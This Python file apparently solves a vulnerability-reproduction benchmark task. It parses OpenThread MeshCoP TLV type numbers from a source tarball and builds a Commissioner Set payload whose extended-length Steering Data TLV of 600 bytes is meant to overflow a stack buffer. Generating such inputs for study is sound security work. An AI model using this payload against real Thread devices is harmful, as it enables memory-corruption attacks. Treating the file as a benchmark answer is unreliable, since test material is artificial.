import os
import re
import tarfile
import tempfile


def _read_text(path):
    try:
        with open(path, "r", errors="ignore") as f:
            return f.read()
    except Exception:
        return ""


def _find_files(root, exts=(".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx", ".txt", ".md")):
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn.endswith(exts):
                yield os.path.join(dirpath, fn)


def _extract_types(src_dir):
    # Try to find MeshCoP TLV type numbers from the source
    # Defaults are guessed for OpenThread MeshCoP TLVs. These may be overridden if found in the source.
    types = {
        "SteeringData": 8,           # kSteeringData
        "BorderAgentLocator": 10,    # kBorderAgentLocator (guess)
        "CommissionerSessionId": 12, # kCommissionerSessionId (guess)
        "CommissionerId": 11,        # kCommissionerId (guess)
    }

    # Search patterns to locate explicit numeric assignments in the code
    patterns = {
        "SteeringData": re.compile(r'\bkSteeringData\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'),
        "BorderAgentLocator": re.compile(r'\bkBorderAgentLocator\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'),
        "CommissionerSessionId": re.compile(r'\bkCommissionerSessionId\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'),
        "CommissionerId": re.compile(r'\bkCommissionerId\b\s*=\s*(0x[0-9a-fA-F]+|\d+)'),
    }

    # Some projects might define these as enums without assignment order. We attempt to parse entire enum if needed.
    enum_block_re = re.compile(r'enum\s+(class\s+)?(Type|TlvType)\s*{([^}]+)}', re.DOTALL)

    for path in _find_files(src_dir):
        txt = _read_text(path)
        if not txt:
            continue

        # Direct assignments
        for key, pat in patterns.items():
            for m in pat.finditer(txt):
                try:
                    val = m.group(1)
                    types[key] = int(val, 0)
                except Exception:
                    pass

        # Parse any enum blocks to infer values if not directly assigned
        for m in enum_block_re.finditer(txt):
            block = m.group(3)
            # Attempt to track enumerator values with implicit increments
            val_counter = -1
            for line in block.split(","):
                line = line.strip()
                if not line:
                    continue
                # Match like: kSteeringData = 8 or kSteeringData
                m2 = re.match(r'(\w+)\s*(=\s*(0x[0-9a-fA-F]+|\d+))?$', line)
                if not m2:
                    continue
                name = m2.group(1)
                if m2.group(3):
                    try:
                        val_counter = int(m2.group(3), 0)
                    except Exception:
                        continue
                else:
                    val_counter += 1
                if name == "kSteeringData":
                    types["SteeringData"] = val_counter
                elif name == "kBorderAgentLocator":
                    types["BorderAgentLocator"] = val_counter
                elif name == "kCommissionerSessionId":
                    types["CommissionerSessionId"] = val_counter
                elif name == "kCommissionerId":
                    types["CommissionerId"] = val_counter

    # Sanity: ensure all values are within 0..255
    for k, v in list(types.items()):
        try:
            iv = int(v)
            if iv < 0 or iv > 255:
                # Clamp into a reasonable TLV type; keep guessed defaults if invalid
                # Defaults chosen above
                pass
            else:
                types[k] = iv
        except Exception:
            pass

    return types


def _build_tlv(t, val):
    l = len(val)
    if l <= 254:
        return bytes([t & 0xff, l & 0xff]) + val
    else:
        return bytes([t & 0xff, 0xff]) + int(l).to_bytes(2, "big") + val


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="arvo20775_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            # If extraction fails for any reason, fallback to building a generic PoC
            pass

        types = _extract_types(tmpdir)

        # Construct a Commissioner Set payload containing:
        # - Commissioner Session ID (small TLV, plausibly required)
        # - Border Agent Locator (small TLV)
        # - Commissioner ID (small TLV)
        # - Steering Data TLV with extended length to trigger overflow (core of the PoC)
        #
        # The vulnerable code copies TLV values into a fixed-size stack buffer (~255),
        # and incorrectly accepts extended-length TLVs (length > 255).
        #
        # To be conservative and avoid huge inputs, choose an extended length that is
        # sufficiently larger than 255 but not excessively large. We pick 600 bytes.
        #
        # Many harnesses accept raw TLVs for Commissioner Set; if the harness expects
        # more data (e.g., CoAP headers), it often surfaces only the payload TLVs to the handler.
        #
        # If the fixed version properly rejects extended length for Commissioner Dataset TLVs,
        # our input should be safely rejected (no crash).
        session_id_type = types.get("CommissionerSessionId", 12)
        border_agent_type = types.get("BorderAgentLocator", 10)
        commissioner_id_type = types.get("CommissionerId", 11)
        steering_data_type = types.get("SteeringData", 8)

        # Small valid-looking TLVs
        session_id_tlv = _build_tlv(session_id_type, b"\x12\x34")  # arbitrary session id
        border_agent_tlv = _build_tlv(border_agent_type, b"\x00\x50")  # UDP port 80 as example
        commissioner_id_tlv = _build_tlv(commissioner_id_type, b"poc-generator")

        # Extended-length TLV with large payload
        overflow_len = 600
        steering_payload = b"A" * overflow_len
        steering_tlv = _build_tlv(steering_data_type, steering_payload)

        # Combine into one payload
        payload = session_id_tlv + border_agent_tlv + commissioner_id_tlv + steering_tlv

        # In case some harness expects a larger payload similar to the ground-truth,
        # append benign padding TLVs to approach or exceed 844 bytes while keeping format valid.
        # Add a couple more benign TLVs with normal lengths to keep structure plausible.
        if len(payload) < 844:
            padding_needed = 844 - len(payload)
            # Use multiple benign TLVs of type commissioner_id_type (normal length)
            pad_chunk = b"B" * min(200, padding_needed)
            while padding_needed > 0:
                chunk = b"B" * min(200, padding_needed)
                payload += _build_tlv(commissioner_id_type, chunk)
                padding_needed = 844 - len(payload)
                if padding_needed <= 0:
                    break

        return payload[:844] if len(payload) >= 844 else payload